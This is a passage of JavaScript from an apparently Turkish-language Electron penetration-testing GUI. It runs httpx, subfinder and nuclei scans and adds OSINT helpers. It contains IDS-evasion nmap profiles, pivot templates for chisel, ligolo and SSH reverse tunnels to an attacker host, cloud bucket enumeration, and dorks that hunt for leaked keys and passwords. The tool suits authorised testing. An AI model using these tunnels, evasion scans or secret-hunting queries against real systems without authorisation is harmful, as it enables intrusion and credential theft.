  { id: 'TA0007', name: 'Discovery', t: ['T1046', 'T1087', 'T1135', 'T1083', 'T1201', 'T1033', 'T1049'] },
  { id: 'TA0008', name: 'Lateral Movement', t: ['T1210', 'T1021', 'T1557'] },
  { id: 'TA0011', name: 'C2', t: ['T1071'] },
];
ipcMain.handle('mitre:tactics', async () => MITRE_TACTICS);

// ---------------- Web pipeline orkestratörü ----------------
// httpx → tech detect → nuclei tags → (opsiyonel) subfinder → her live host'a httpx.
let currentWeb = null;
ipcMain.handle('web:pipeline', async (e, { target, opts }) => {
  if (currentWeb) return { ok: false, error: 'Zaten çalışan web pipeline var.' };
  if (!sanitizeTarget(target)) return { ok: false, error: 'Geçersiz hedef' };
  const o = opts || {};
  currentWeb = { stopped: false };
  const send = (step, data) => mainWindow.webContents.send('web:step', { step, data });
  const ws = db.getActiveWorkspace();
  const auditTag = (s) => { try { if (ws) db.addAudit(ws.id, 'recon', `web-pipeline: ${s}`); } catch (_) {} };

  // 1. httpx fingerprint (root URL)
  send('start', { target });
  auditTag(`start ${target}`);
  const httpxRun = (urls) => new Promise((resolve) => {
    const { cmd, args } = toolProc('httpx', [
      '-silent', '-json', '-status-code', '-title', '-tech-detect', '-server', '-no-color',
    ].concat(urls.length === 1 ? ['-u', urls[0]] : ['-l', '-']));
    const proc = spawn(cmd, args, { windowsHide: true });
    const results = [];
    let buf = '';
    proc.stdout.on('data', (d) => {
      buf += d.toString();
      let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, i).trim(); buf = buf.slice(i + 1);
        if (!line) continue;
        try {
          const j = JSON.parse(line);
          results.push({
            url: j.url || j.input || '',
            status: j.status_code || j['status-code'] || 0,
            title: j.title || '',
            tech: j.tech || j.technologies || [],
            server: j.webserver || j.server || '',
          });
        } catch (_) {}
      }
    });
    proc.stderr.on('data', () => {});
    proc.on('close', () => resolve(results));
    proc.on('error', () => resolve([]));
    if (urls.length > 1) { proc.stdin.write(urls.join('\n')); proc.stdin.end(); }
  });

  const rootUrl = /^https?:\/\//.test(target) ? target : 'http://' + target;
  const root = await httpxRun([rootUrl]);
  send('httpx', { count: root.length, results: root });
  if (currentWeb.stopped) { currentWeb = null; send('done', { stopped: true }); return { ok: true }; }

  // 2. Tech stack → nuclei tag inference
  const allTech = new Set();
  root.forEach((r) => (r.tech || []).forEach((t) => allTech.add(String(t).toLowerCase())));
  // Bilinen tech → nuclei tag eşlemesi
  const TECH_TAG = {
    wordpress: 'wordpress,wp', joomla: 'joomla', drupal: 'drupal',
    apache: 'apache', nginx: 'nginx', iis: 'iis', tomcat: 'tomcat,struts',
    jenkins: 'jenkins', gitlab: 'gitlab', confluence: 'confluence', jira: 'jira',
    phpmyadmin: 'phpmyadmin', exchange: 'exchange', sharepoint: 'sharepoint',
    laravel: 'laravel', django: 'django', rails: 'rails',
    'spring boot': 'springboot', spring: 'springboot,spring',
    grafana: 'grafana', kibana: 'kibana', elasticsearch: 'elastic',
    weblogic: 'weblogic', citrix: 'citrix', fortinet: 'fortinet',
  };
  const tags = new Set(['default-logins', 'misconfiguration', 'exposure']);
  allTech.forEach((tech) => Object.entries(TECH_TAG).forEach(([k, v]) => {
    if (tech.includes(k)) v.split(',').forEach((x) => tags.add(x));
  }));
  send('tech', { tech: [...allTech], nucleiTags: [...tags] });

  // 3. (opsiyonel) Subfinder → live subdomain
  let liveSubs = [];
  if (o.subdomains && /^[a-zA-Z0-9.-]{3,80}$/.test(target.replace(/^https?:\/\//, ''))) {
    send('subfinder', { status: 'çalışıyor' });
    const dom = target.replace(/^https?:\/\//, '').split('/')[0];
    const subs = await new Promise((resolve) => {
      const { cmd, args } = toolProc('subfinder', ['-d', dom, '-silent']);
      const p = spawn(cmd, args, { windowsHide: true });
      const out = [];
      p.stdout.on('data', (d) => d.toString().split('\n').forEach((s) => { if (s.trim()) out.push(s.trim()); }));
      p.on('close', () => resolve(out));
      p.on('error', () => resolve([]));
    });
    send('subfinder', { count: subs.length, list: subs.slice(0, 50) });
    if (subs.length && !currentWeb.stopped) {
      const urls = subs.slice(0, 50).map((s) => 'http://' + s);
      liveSubs = await httpxRun(urls);
      send('subhttpx', { count: liveSubs.length, results: liveSubs });
    }
  }
  if (currentWeb.stopped) { currentWeb = null; send('done', { stopped: true }); return { ok: true }; }

  // 4. nuclei (root + 10 live sub) with inferred tags
  if (o.nuclei !== false) {
    const targets = [rootUrl, ...liveSubs.slice(0, 10).map((x) => x.url)].filter(Boolean);
    send('nuclei', { status: 'başlatılıyor', targets: targets.length, tags: [...tags] });
    const nucleiArgs = ['-jsonl', '-silent', '-nc', '-tags', [...tags].join(','), '-severity', o.severity || 'low,medium,high,critical'];
    targets.forEach((t) => nucleiArgs.push('-u', t));
    const { cmd, args } = toolProc('nuclei', nucleiArgs);
    const findings = [];
    let nbuf = '';
    await new Promise((resolve) => {
      const p = spawn(cmd, args, { windowsHide: true });
      p.stdout.on('data', (d) => {
        nbuf += d.toString();
        let i;
        while ((i = nbuf.indexOf('\n')) >= 0) {
          const line = nbuf.slice(0, i).trim(); nbuf = nbuf.slice(i + 1);
          if (!line) continue;
          try {
            const j = JSON.parse(line);
            const f = {
              host: (j.host || j.ip || '').replace(/^https?:\/\//, '').split(/[:/]/)[0],
              port: (j.port || '').toString(),
              templateId: j['template-id'] || '', name: (j.info && j.info.name) || '',
              severity: (j.info && j.info.severity) || 'info',
              cve: (j.info && j.info.classification && [].concat(j.info.classification['cve-id'] || []).filter(Boolean)[0]) || '',
            };
            findings.push(f);
            send('finding', f);
          } catch (_) {}
        }
      });
      p.stderr.on('data', () => {});
      p.on('close', () => resolve());
      p.on('error', () => resolve());
    });
    if (findings.length && ws) {
      db.addNucleiFindings(ws.id, findings);
      // İlgili host'lardaki etiketsiz finding'lere MITRE T1595.002 (Vulnerability Scanning) yaz
      try { db.bulkTagMitre(ws.id, findings.map((f) => f.host), 'T1595.002'); }
      catch (e) { log('mitre toplu etiketleme hatası: ' + e); }
    }
    send('nuclei', { status: 'bitti', count: findings.length });
  }

  send('done', { stopped: false });
  auditTag(`bitti ${target}`);
  currentWeb = null;
  return { ok: true };
});
ipcMain.handle('web:stop', async () => { if (currentWeb) { currentWeb.stopped = true; return { ok: true }; } return { ok: false }; });

// ---------------- DOCX (Word-uyumlu HTML) ----------------
// Yeni npm bağımlılığı yok: mevcut profesyonel rapor HTML'ini Word-uyumlu
// MHT-style wrapper'a sarıp .doc uzantısıyla yazıyoruz. Word açar/düzenler.
// Gerçek OOXML .docx için ileride 'docx' paketi eklenebilir.
ipcMain.handle('report:docx', async (e, wsId) => {
  const ws = db.listWorkspaces().find((w) => w.id === wsId) || db.getActiveWorkspace();
  if (!ws) return { ok: false, error: 'workspace yok' };
  const a = db.workspaceAssets(ws.id);
  a.evidence = db.listEvidence(ws.id);
  const inner = buildProfessionalReport(ws, a);
  // Word'ün doğal okuduğu HTML formatı: Content-Type + body-only
  const doc =
    `<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns="http://www.w3.org/TR/REC-html40">
<head><meta charset="utf-8"><title>${ws.name}</title>
<!--[if gte mso 9]><xml><w:WordDocument><w:View>Print</w:View><w:Zoom>100</w:Zoom></w:WordDocument></xml><![endif]-->
</head><body>${inner.replace(/^[\s\S]*<body[^>]*>/, '').replace(/<\/body>[\s\S]*$/, '')}</body></html>`;
  const { canceled, filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'Word raporu kaydet', defaultPath: `pentest-rapor-${ws.name}-${Date.now()}.doc`,
    filters: [{ name: 'Word', extensions: ['doc'] }],
  });
  if (canceled || !filePath) return { ok: false, error: 'iptal' };
  try {
    fs.writeFileSync(filePath, '﻿' + doc, 'utf8');
    db.addAudit(ws.id, 'report', 'Word raporu üretildi');
    return { ok: true, path: filePath };
  } catch (err) { return { ok: false, error: String(err) }; }
});

// ===================================================================
// Faz 4: Stealth profilleri + Pivot wizard + Host notes + OSINT genişletme
// ===================================================================

// Tarama profilleri — renderer args'a karıştırılır. Sadece nmap paket üretimini
// değiştiren bayraklar; dosya açmaz, yeni bağlantı kurmaz.
const SCAN_PROFILES = {
  loud:     { label: 'Loud',     desc: 'Hızlı, gürültülü; SOC yakalar.',
              args: ['-T5', '--min-rate', '5000'] },
  normal:   { label: 'Normal',   desc: 'Varsayılan denge (-T4).',
              args: ['-T4'] },
  stealth:  { label: 'Stealth',  desc: 'Yavaş + fragmentli, kaynak port 53.',
              args: ['-T2', '-f', '--source-port', '53', '--data-length', '24', '--randomize-hosts'] },
  paranoid: { label: 'Paranoid', desc: 'En sessiz; ağır IDS evasion.',
              args: ['-T0', '-f', '--source-port', '53', '--data-length', '32',
                     '--randomize-hosts', '--scan-delay', '5s'] },
};
ipcMain.handle('scan:profiles', async () => Object.entries(SCAN_PROFILES).map(([id, p]) =>
  ({ id, label: p.label, desc: p.desc, args: p.args })));

// ---------------- Pivot şablonları ----------------
ipcMain.handle('pivot:templates', async (e, { lhost, lport, targetIp, targetPort } = {}) => {
  const L = lhost || 'LHOST'; const P = lport || '8000';
  const T = targetIp || 'INTERNAL_IP'; const TP = targetPort || 'INTERNAL_PORT';
  return {
    chisel: {
      socks: {
        server: `chisel server -p ${P} --reverse`,
        client: `chisel client ${L}:${P} R:1080:socks`,
        use:    `proxychains nmap -sT -Pn 10.10.10.0/24`,
      },
      forward: {
        server: `chisel server -p ${P} --reverse`,
        client: `chisel client ${L}:${P} R:${TP}:${T}:${TP}`,
        use:    `${L}:${TP} → ${T}:${TP} ulaşır`,
      },
    },
    ligolo: {
      server: `sudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add ${T}/24 dev ligolo\n./proxy -selfcert -laddr 0.0.0.0:11601`,
      agent:  `./agent -connect ${L}:11601 -ignore-cert`,
      use:    `proxy> session\nproxy> start`,
    },
    proxychains: {
      conf: `# /etc/proxychains4.conf — sona ekle\n[ProxyList]\nsocks5 127.0.0.1 1080`,
      use:  `proxychains <cmd>   # örn: proxychains nmap -sT ${T}`,
    },
    sshDynamic: {
      cmd:  `ssh -D 1080 -N user@${L}`,
      use:  `SOCKS proxy 127.0.0.1:1080`,
    },
    sshLocal: {
      cmd:  `ssh -L 8443:${T}:${TP} user@${L} -N`,
      use:  `attacker:8443 → ${T}:${TP}`,
    },
    sshRemote: {
      cmd:  `ssh -R ${P}:127.0.0.1:8000 user@${L} -N`,
      use:  `${L}:${P} → attacker:8000`,
    },
  };
});

ipcMain.handle('net:localIps', async () => {
  const ifaces = os.networkInterfaces();
  const out = [];
  Object.entries(ifaces).forEach(([name, list]) => {
    (list || []).forEach((n) => {
      if (n.family === 'IPv4' && !n.internal) out.push({ iface: name, ip: n.address });
    });
  });
  return out;
});

// ---------------- Host notes ----------------
ipcMain.handle('notes:get', async (e, { ws, host }) => {
  const id = ws || (db.getActiveWorkspace() && db.getActiveWorkspace().id);
  if (!id) return null;
  return db.getNote(id, host);
});
ipcMain.handle('notes:set', async (e, { ws, host, content }) => {
  const id = ws || (db.getActiveWorkspace() && db.getActiveWorkspace().id);
  if (!id) return { ok: false, error: 'workspace yok' };
  return { ok: true, note: db.setNote(id, host, content) };
});
ipcMain.handle('notes:list', async (e, wsId) => {
  const id = wsId || (db.getActiveWorkspace() && db.getActiveWorkspace().id);
  if (!id) return [];
  return db.listNotes(id);
});

// ---------------- OSINT: Wayback Machine ----------------
ipcMain.handle('osint:wayback', async (e, domain) => {
  if (!/^[a-zA-Z0-9.-]{1,100}$/.test(domain || '')) return { ok: false, error: 'Geçersiz alan adı' };
  return new Promise((resolve) => {
    const url = `https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(domain)}/*&output=json&fl=original&collapse=urlkey&limit=2000`;
    https.get(url, { headers: { 'User-Agent': 'NmapGUI' } }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => {
        try {
          const arr = JSON.parse(body);
          const urls = arr.slice(1).map((r) => r[0]).filter(Boolean);
          resolve({ ok: true, urls });
        } catch (err) { resolve({ ok: false, error: 'Wayback yanıtı çözümlenemedi' }); }
      });
    }).on('error', (err) => resolve({ ok: false, error: String(err) }));
  });
});

// ---------------- OSINT: GitHub dork üretici ----------------
ipcMain.handle('osint:ghDorks', async (e, target) => {
  const q = (target || '').trim();
  if (!/^[a-zA-Z0-9._-]{2,100}$/.test(q)) return { ok: false, error: 'Geçersiz hedef' };
  const dorks = [
    { name: 'Genel sızıntı', q: `"${q}" password` },
    { name: 'API anahtarı', q: `"${q}" "api_key"` },
    { name: 'AWS anahtarı', q: `"${q}" AKIA` },
    { name: 'Slack token', q: `"${q}" xoxb-` },
    { name: '.env dosyası', q: `"${q}" filename:.env` },
    { name: 'config.json', q: `"${q}" filename:config.json` },
    { name: 'id_rsa', q: `"${q}" filename:id_rsa` },
    { name: 'pem private key', q: `"${q}" "BEGIN RSA PRIVATE KEY"` },
    { name: 'JWT secret', q: `"${q}" jwt_secret` },
    { name: 'Mongo URI', q: `"${q}" "mongodb://"` },
    { name: 'internal hostnames', q: `"${q}" hostname` },
    { name: 'Jenkins config', q: `"${q}" filename:config.xml jenkins` },
  ];
  return { ok: true, dorks: dorks.map((d) => ({ ...d, url: `https://github.com/search?q=${encodeURIComponent(d.q)}&type=code` })) };
});

// ===================================================================
// OSINT genişletme (5'li paket): ASN, favicon hash, cloud buckets, mail-sec, gdorks
// Hepsi pasif: hedefe tek paket atmaz (cloud buckets hariç — 3rd party HEAD).
// ===================================================================

// ---------------- 1) ASN / netblock keşfi (bgpview.io — ücretsiz, no-auth) ----------------
ipcMain.handle('osint:asn', async (e, q) => {
  const s = (q || '').trim();
  if (!s) return { ok: false, error: 'IP veya ASN girin' };
  // Tek IP → /ip/<ip>, ASN numarası → /asn/<n>, alan adı verilirse önce A kaydı çöz
  let url;
  if (/^\d+\.\d+\.\d+\.\d+$/.test(s)) url = `https://api.bgpview.io/ip/${s}`;
  else if (/^(AS)?\d+$/i.test(s)) url = `https://api.bgpview.io/asn/${s.replace(/^AS/i, '')}/prefixes`;
  else if (/^[a-zA-Z0-9.-]{1,100}$/.test(s)) {
    try {
      const ips = await dns.resolve4(s);
      if (!ips || !ips[0]) return { ok: false, error: 'A kaydı çözümlenemedi' };
      url = `https://api.bgpview.io/ip/${ips[0]}`;
    } catch (err) { return { ok: false, error: 'DNS hatası: ' + err.message }; }
  } else return { ok: false, error: 'Geçersiz girdi' };
  return new Promise((resolve) => {
    httpsGetJson(url, (err, data) => {
      if (err || !data) return resolve({ ok: false, error: 'bgpview hatası' });
      if (data.status !== 'ok') return resolve({ ok: false, error: data.status_message || 'API hatası' });
      const d = data.data || {};
      // /ip yanıtı: prefixes -> her birinde asn{}, prefix, name, description
      // /asn/prefixes yanıtı: ipv4_prefixes[], ipv6_prefixes[]
      let prefixes = [];
      let asnInfo = null;
      if (d.prefixes) {
        prefixes = d.prefixes.map((p) => ({
          prefix: p.prefix, name: p.name || '', desc: p.description || '',
          asn: p.asn && p.asn.asn, asnName: p.asn && p.asn.name,
        }));
        if (d.prefixes[0] && d.prefixes[0].asn) {
          asnInfo = { asn: d.prefixes[0].asn.asn, name: d.prefixes[0].asn.name,
                      country: d.prefixes[0].asn.country_code, desc: d.prefixes[0].asn.description };
        }
      } else if (d.ipv4_prefixes) {
        prefixes = d.ipv4_prefixes.map((p) => ({ prefix: p.prefix, name: p.name || '', desc: p.description || '' }));
      }
      resolve({ ok: true, query: s, asnInfo, prefixes });
    });
  });
});

// ---------------- 2) Favicon hash (mmh3 32-bit signed) ----------------
// Pure-JS MurmurHash3 x86_32 (mmh3), Shodan'ın kullandığı varyant.
// Saf implementasyon — npm bağımlılığı yok.
function mmh3_32(key, seed = 0) {
  const data = Buffer.from(key);
  const len = data.length;
  const nblocks = Math.floor(len / 4);
  let h1 = seed | 0;
  const c1 = 0xcc9e2d51 | 0;
  const c2 = 0x1b873593 | 0;
  const rotl32 = (x, r) => ((x << r) | (x >>> (32 - r))) | 0;
  const mul32 = (a, b) => {
    // 32-bit imzasız çarpma
    const ah = (a >>> 16) & 0xffff, al = a & 0xffff;
    const bh = (b >>> 16) & 0xffff, bl = b & 0xffff;
    return ((al * bl) + (((ah * bl + al * bh) << 16) >>> 0)) | 0;
  };
  for (let i = 0; i < nblocks; i++) {
    let k1 = data.readInt32LE(i * 4);
    k1 = mul32(k1, c1);
    k1 = rotl32(k1, 15);
    k1 = mul32(k1, c2);
    h1 ^= k1;
    h1 = rotl32(h1, 13);
    h1 = (mul32(h1, 5) + 0xe6546b64) | 0;
  }
  let k1 = 0;
  const tail = nblocks * 4;
  switch (len & 3) {
    case 3: k1 ^= data[tail + 2] << 16;
    case 2: k1 ^= data[tail + 1] << 8;
    case 1:
      k1 ^= data[tail];
      k1 = mul32(k1, c1);
      k1 = rotl32(k1, 15);
      k1 = mul32(k1, c2);
      h1 ^= k1;
  }
  h1 ^= len;
  // fmix32
  h1 ^= h1 >>> 16;
  h1 = mul32(h1, 0x85ebca6b);
  h1 ^= h1 >>> 13;
  h1 = mul32(h1, 0xc2b2ae35);
  h1 ^= h1 >>> 16;
  return h1 | 0; // 32-bit signed
}

ipcMain.handle('osint:faviconHash', async (e, target) => {
  const s = (target || '').trim();
  if (!s || !/^[a-zA-Z0-9.:/_-]{3,200}$/.test(s)) return { ok: false, error: 'Geçersiz hedef' };
  const url = /^https?:\/\//.test(s) ? (s.replace(/\/$/, '') + '/favicon.ico') : ('https://' + s.replace(/\/$/, '') + '/favicon.ico');
  return new Promise((resolve) => {
    https.get(url, { headers: { 'User-Agent': 'NmapGUI/1.0' } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        // tek hop redirect
        return https.get(res.headers.location, (r2) => collect(r2));
      }
      collect(res);
    }).on('error', (err) => resolve({ ok: false, error: String(err) }));
    function collect(r) {
      if (r.statusCode !== 200) return resolve({ ok: false, error: 'HTTP ' + r.statusCode });
      const chunks = [];
      r.on('data', (c) => chunks.push(c));
      r.on('end', () => {
        const buf = Buffer.concat(chunks);
        // Shodan favicon: base64(buf) + line wrap 76 char + final \n, sonra mmh3
        const b64 = buf.toString('base64');
        const wrapped = b64.match(/.{1,76}/g).join('\n') + '\n';
        const hash = mmh3_32(wrapped, 0);
        resolve({
          ok: true, url, size: buf.length, hash,
          shodan: `http.favicon.hash:${hash}`,
          shodanUrl: `https://www.shodan.io/search?query=${encodeURIComponent('http.favicon.hash:' + hash)}`,
          censysUrl: `https://search.censys.io/search?resource=hosts&q=${encodeURIComponent('services.http.response.favicons.md5_hash:* and services.http.response.favicons.md5_hash="' + crypto.createHash('md5').update(buf).digest('hex') + '"')}`,
        });
      });
    }
  });
});

// ---------------- 3) Cloud bucket enumeration (S3 + Azure + GCS) ----------------
// HEAD ile sınırlı paralel sorgu. Permütasyon listesi şirket adından üretilir.
const BUCKET_TEMPLATES = [
  '{name}', '{name}-backup', '{name}-backups', '{name}-bak',
  '{name}-prod', '{name}-production', '{name}-staging', '{name}-stage',
  '{name}-dev', '{name}-development', '{name}-test', '{name}-qa',
  '{name}-data', '{name}-public', '{name}-private', '{name}-internal',
  '{name}-assets', '{name}-static', '{name}-media', '{name}-files',
  '{name}-images', '{name}-uploads', '{name}-downloads', '{name}-archive',
  '{name}-logs', '{name}-db', '{name}-database', '{name}-dump',
  '{name}-config', '{name}-secrets', '{name}-keys', '{name}-temp',
  'backup-{name}', 'prod-{name}', 'dev-{name}', 'test-{name}',
  '{name}-eu', '{name}-us', '{name}-app',
];
function headStatus(url, timeoutMs) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const opts = { method: 'HEAD', hostname: u.hostname, path: u.pathname || '/',
                   headers: { 'User-Agent': 'NmapGUI/1.0' }, timeout: timeoutMs || 5000 };
    const req = https.request(opts, (res) => { resolve(res.statusCode); res.resume(); });
    req.on('timeout', () => { req.destroy(); resolve(0); });
    req.on('error', () => resolve(0));
    req.end();
  });
}
async function poolMap(items, concurrency, fn) {
  const out = []; let i = 0;
  async function worker() { while (i < items.length) { const idx = i++; out[idx] = await fn(items[idx], idx); } }
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
  return out;
}
ipcMain.handle('osint:buckets', async (e, name) => {
  const n = (name || '').trim().toLowerCase();
  if (!/^[a-z0-9-]{2,60}$/.test(n)) return { ok: false, error: 'Geçersiz şirket adı (a-z, 0-9, tire)' };
  const cands = [];
  BUCKET_TEMPLATES.forEach((tpl) => {
    const b = tpl.replace('{name}', n);
    // S3 hem path-style hem virtual-host
    cands.push({ provider: 'aws', bucket: b, url: `https://${b}.s3.amazonaws.com/`,
                 web: `https://s3.console.aws.amazon.com/s3/buckets/${b}` });
    cands.push({ provider: 'azure', bucket: b, url: `https://${b}.blob.core.windows.net/`,
                 web: `https://${b}.blob.core.windows.net/?comp=list` });
    cands.push({ provider: 'gcs', bucket: b, url: `https://storage.googleapis.com/${b}/`,
                 web: `https://console.cloud.google.com/storage/browser/${b}` });
  });
  const results = await poolMap(cands, 16, async (c) => {
    const code = await headStatus(c.url, 4000);
    return { ...c, code };
  });
  // 200 = açık (read), 403 = var ama gizli, 404/0 = yok / unreachable
  const hits = results.filter((r) => r.code === 200 || r.code === 403);
  return { ok: true, total: results.length, hits };
});

// ---------------- 4) Mail security (SPF / DMARC / DKIM) ----------------
async function getTxt(name) {
  try { return (await dns.resolveTxt(name)).map((parts) => parts.join('')); }
  catch (e) { return []; }
}
ipcMain.handle('osint:mailSec', async (e, domain) => {
  if (!/^[a-zA-Z0-9.-]{1,100}$/.test(domain || '')) return { ok: false, error: 'Geçersiz alan adı' };
  const [spfTxt, dmarcTxt, mxRec] = await Promise.all([
    getTxt(domain),
    getTxt('_dmarc.' + domain),
    dns.resolveMx(domain).catch(() => []),
  ]);
  // SPF
  const spfLine = spfTxt.find((s) => /^v=spf1/i.test(s));
  let spf = { present: false };
  if (spfLine) {
    spf.present = true; spf.raw = spfLine;
    const m = spfLine.match(/[~?+-]all\b/);
    spf.qualifier = m ? m[0] : null;
    spf.weak = !m || /\+all/.test(spfLine) || /~all/.test(spfLine);
    spf.strict = /-all\b/.test(spfLine);
    spf.lookups = (spfLine.match(/include:|a |mx |a:|mx:|ptr|exists:/g) || []).length;
  }
  // DMARC
  const dmarcLine = dmarcTxt.find((s) => /^v=DMARC1/i.test(s));
  let dmarc = { present: false };
  if (dmarcLine) {
    dmarc.present = true; dmarc.raw = dmarcLine;
    const p = dmarcLine.match(/p=(\w+)/i); dmarc.policy = p ? p[1].toLowerCase() : '';
    const sp = dmarcLine.match(/sp=(\w+)/i); dmarc.subPolicy = sp ? sp[1].toLowerCase() : '';
    const pct = dmarcLine.match(/pct=(\d+)/i); dmarc.pct = pct ? parseInt(pct[1], 10) : 100;
    const rua = dmarcLine.match(/rua=([^;]+)/i); dmarc.rua = rua ? rua[1].trim() : '';
    dmarc.weak = dmarc.policy === 'none' || dmarc.pct < 100;
  }
  // DKIM — yaygın selector'ları dene
  const selectors = ['default', 'google', 'k1', 'k2', 'selector1', 'selector2', 'mail', 'dkim', 'mandrill', 'mailo', 's1', 's2', 'm1'];
  const dkimHits = [];
  await Promise.all(selectors.map(async (sel) => {
    const txt = await getTxt(`${sel}._domainkey.${domain}`);
    const line = txt.find((s) => /v=DKIM1/i.test(s) || /p=/.test(s));
    if (line) dkimHits.push({ selector: sel, raw: line, hasPub: /p=[A-Za-z0-9+/]{20,}/.test(line) });
  }));
  // BIMI (görsel ek — bilgi)
  const bimiTxt = await getTxt('default._bimi.' + domain);
  const bimi = bimiTxt.find((s) => /v=BIMI1/i.test(s)) || null;

  // Risk skoru: 0-100 (yüksek = kötü)
  let risk = 0;
  if (!spf.present) risk += 30; else if (spf.weak && !spf.strict) risk += 15;
  if (!dmarc.present) risk += 40;
  else if (dmarc.policy === 'none') risk += 25;
  else if (dmarc.policy === 'quarantine') risk += 10;
  if (dkimHits.length === 0) risk += 15;
  if (spf.lookups > 10) risk += 5; // RFC 7208 ihlali
  return {
    ok: true, domain, spf, dmarc, dkim: dkimHits, bimi, mx: mxRec.map((m) => ({ pref: m.priority, host: m.exchange })),
    risk: Math.min(100, risk),
    verdict: risk >= 60 ? 'spoofing kolay' : risk >= 30 ? 'kısmi koruma' : 'iyi yapılandırma',
  };
});

// ---------------- 5) Google dork builder ----------------
ipcMain.handle('osint:googleDorks', async (e, target) => {
  const q = (target || '').trim();
  if (!/^[a-zA-Z0-9._-]{2,100}$/.test(q)) return { ok: false, error: 'Geçersiz hedef' };
  const dorks = [
    // Klasör/dosya keşfi
    { cat: 'index', name: 'Open directory', q: `site:${q} intitle:"index of"` },
    { cat: 'index', name: 'Backup dosyaları', q: `site:${q} ext:bak | ext:old | ext:backup | ext:sql | ext:zip` },
    { cat: 'index', name: 'Log/config', q: `site:${q} ext:log | ext:env | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini` },
    { cat: 'index', name: 'Office dokümanlar', q: `site:${q} ext:doc | ext:docx | ext:xls | ext:xlsx | ext:pdf` },
    // Panel/giriş
    { cat: 'panel', name: 'Yönetici paneli', q: `site:${q} inurl:admin | inurl:login | inurl:portal | inurl:dashboard` },
    { cat: 'panel', name: 'phpMyAdmin', q: `site:${q} inurl:phpmyadmin` },
    { cat: 'panel', name: 'CMS yönetim', q: `site:${q} inurl:wp-admin | inurl:wp-login | inurl:joomla/administrator` },
    { cat: 'panel', name: 'Citrix/RDWeb', q: `site:${q} inurl:Citrix/ | inurl:rdweb | inurl:vpn` },
    // Kimlik/parola
    { cat: 'cred', name: 'Parola sızıntısı', q: `site:${q} intext:"password" | intext:"passwd" | intext:"pwd"` },
    { cat: 'cred', name: 'API key görünür', q: `site:${q} intext:"api_key" | intext:"apikey" | intext:"client_secret"` },
    { cat: 'cred', name: 'Connection string', q: `site:${q} intext:"jdbc:" | intext:"mongodb://" | intext:"Server=" | intext:"Data Source="` },
    // Hata/debug
    { cat: 'debug', name: 'PHP hata', q: `site:${q} intext:"warning: " | intext:"fatal error" | intext:"on line"` },
    { cat: 'debug', name: 'Stack trace', q: `site:${q} intext:"at java." | intext:"Exception in" | intext:"Traceback"` },
    { cat: 'debug', name: 'SQL hata', q: `site:${q} intext:"SQL syntax" | intext:"mysql_fetch" | intext:"ORA-01756"` },
    // 3rd party / sızıntı
    { cat: 'leak', name: 'Pastebin', q: `site:pastebin.com "${q}"` },
    { cat: 'leak', name: 'Trello/board', q: `site:trello.com "${q}" | site:trello.com inurl:${q}` },
    { cat: 'leak', name: 'AWS/S3 herkese açık', q: `site:s3.amazonaws.com "${q}"` },
    { cat: 'leak', name: 'Atlassian Confluence', q: `site:atlassian.net "${q}"` },
    { cat: 'leak', name: 'LinkedIn personel', q: `site:linkedin.com/in "${q}"` },
    { cat: 'leak', name: 'GitHub kullanıcılar', q: `site:github.com "${q}"` },
    // Sertifika/subdomain
    { cat: 'subdomain', name: 'Subdomain (site)', q: `site:*.${q} -www` },
    { cat: 'subdomain', name: 'Subdomain (intext)', q: `intext:"${q}" inurl:${q}` },
    // SSO/OAuth
    { cat: 'sso', name: 'OAuth misconfig', q: `site:${q} inurl:oauth | inurl:sso | inurl:saml | inurl:callback` },
    { cat: 'sso', name: '.well-known', q: `site:${q} inurl:".well-known/"` },
    // VPN / VPN sağlayıcı izleri
    { cat: 'vpn', name: 'VPN portalı', q: `site:${q} intext:"VPN" inurl:vpn | inurl:portal` },
  ];
  return {
    ok: true,
    dorks: dorks.map((d) => ({ ...d, url: `https://www.google.com/search?q=${encodeURIComponent(d.q)}` })),
  };
});

// ===================================================================
// OSINT 2. paket: WHOIS, Reverse IP, TLS SAN, Subdomain takeover, HTTP recon
// ===================================================================

// ---------------- 6) WHOIS / RDAP (anahtarsız JSON) ----------------
ipcMain.handle('osint:whois', async (e, domain) => {
  const d = (domain || '').trim().toLowerCase();
  if (!/^[a-z0-9.-]{3,100}$/.test(d)) return { ok: false, error: 'Geçersiz alan adı' };
  return new Promise((resolve) => {
    // rdap.org IANA bootstrap üzerinden doğru TLD RDAP sunucusuna yönlendirir
    httpsGetJson(`https://rdap.org/domain/${d}`, (err, data) => {
      if (err || !data) return resolve({ ok: false, error: 'RDAP hatası' });
      if (data.errorCode) return resolve({ ok: false, error: data.title || 'WHOIS bulunamadı' });
      const events = data.events || [];
      const ev = (act) => (events.find((x) => x.eventAction === act) || {}).eventDate || '';
      const entities = data.entities || [];
      const findRole = (role) => entities.find((en) => (en.roles || []).includes(role));
      const vcard = (en) => {
        if (!en || !en.vcardArray || !Array.isArray(en.vcardArray[1])) return {};
        const out = {};
        en.vcardArray[1].forEach((row) => {
          if (!Array.isArray(row)) return;
          const [k, , , v] = row;
          if (k === 'fn') out.name = v;
          if (k === 'org') out.org = v;
          if (k === 'email') out.email = v;
          if (k === 'tel') out.tel = v;
          if (k === 'adr' && Array.isArray(v)) out.addr = v.filter(Boolean).join(', ');
        });
        return out;
      };
      const reg = findRole('registrant');
      const adm = findRole('administrative');
      const tech = findRole('technical');
      const registrar = findRole('registrar') || entities.find((en) => en.handle);
      resolve({
        ok: true, domain: d,
        registrar: registrar ? (vcard(registrar).name || registrar.handle || '') : '',
        registered: ev('registration'),
        expires: ev('expiration'),
        updated: ev('last changed') || ev('last update of RDAP database'),
        status: data.status || [],
        nameservers: (data.nameservers || []).map((ns) => (ns.ldhName || '').toLowerCase()),
        registrant: vcard(reg), admin: vcard(adm), tech: vcard(tech),
        dnssec: !!data.secureDNS && !!data.secureDNS.delegationSigned,
      });
    });
  });
});

// ---------------- 7) Reverse IP (hackertarget.com — günde 50 ücretsiz) ----------------
ipcMain.handle('osint:reverseIp', async (e, ip) => {
